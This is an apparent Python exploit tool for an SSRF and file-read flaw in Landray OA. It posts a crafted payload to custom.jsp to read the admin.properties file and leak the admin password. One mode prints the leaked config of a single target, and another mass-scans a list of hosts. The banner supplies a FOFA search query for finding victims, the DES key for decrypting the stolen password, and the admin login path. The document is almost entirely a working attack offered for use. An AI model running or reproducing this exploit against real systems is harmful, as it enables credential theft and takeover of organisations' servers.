# app="Landray-OA系统"
import requests
import sys
import argparse
import urllib3
urllib3.disable_warnings()

def banner():
    print('+---------------------------------------------------+')
    print('+ \033[1;36m蓝凌OA SSRF漏洞    \033[0m                               +')
    print('+ \033[1;36m公众号：bgbing安全\033[0m                                +')
    print('+ \033[1;36m作者：黑子黑\033[0m                                      +')
    print('+ \033[1;36mpython3 xxx.py -u/--url http://xxx.xxx.xxx.xxx\033[0m    +')
    print('+ \033[1;36mpython3 xxx.py -f/--file result.txt\033[0m               +')
    print('+ \033[1;36m作者：黑子黑\033[0m                                      +')
    print('+ \033[1;36mfofa 语句：app="Landray-OA系统"           \033[0m        +')
    print('+ \033[1;36mpassword使用DES方法解密，密钥为 **kmssAdminKey**\033[0m  +')
    print('+ \033[1;36m解密完后，登录http://xxx.xxx.xxx.xxx/admin.do\033[0m     +')
    print('+---------------------------------------------------+')
if len(sys.argv)==1:
    banner()
    sys.exit()
parser = argparse.ArgumentParser(description='bgbingfofaapi help')
parser.add_argument('-u','--url', help='Please Input a url!',default='')
parser.add_argument('-f','--file', help='Please Input a file!',default='')
args=parser.parse_args()
url=args.url
file=args.file
if url!="":
    url=url+"/sys/ui/extend/varkind/custom.jsp"
    header={
    "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36",
    "Content-Type":"application/x-www-form-urlencoded"
            }
    data='var={"body":{"file":"/WEB-INF/KmssConfig/admin.properties"}}'
    response=requests.post(url,data=data,headers=header,verify=False,timeout=10)
    if 'password' in response.text:
        print("\033[1;36m"+response.text+"\033[0m")
    else:
        print("\033[1;36m"+url+"\033[0m"+"\033[1;31m 不存在漏洞\033[0m")
if file!="":
    txt=file
    f=open(txt,'r+')
    for i in f.readlines():
        url=i.strip()
        if url.startswith('http:')!=1 and url.startswith('https:')!=1:
            url='http://'+url
        url=url+"/sys/ui/extend/varkind/custom.jsp"
        header={
        "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36",
        "Content-Type":"application/x-www-form-urlencoded"
                }
        data='var={"body":{"file":"/WEB-INF/KmssConfig/admin.properties"}}'
        try:
            response=requests.post(url,data=data,headers=header,verify=False,timeout=10)
            if 'password' in response.text:
                print("\033[1;36m"+url+"\033[0m"+"\033[1;32m 存在漏洞\033[0m")
            else:
                print("\033[1;36m"+url+"\033[0m"+"\033[1;31m 不存在漏洞\033[0m")
        except Exception as e:
            print("\033[1;36m"+url+"\033[0m"+"\033[1;31m 不存在漏洞\033[0m",format(e))
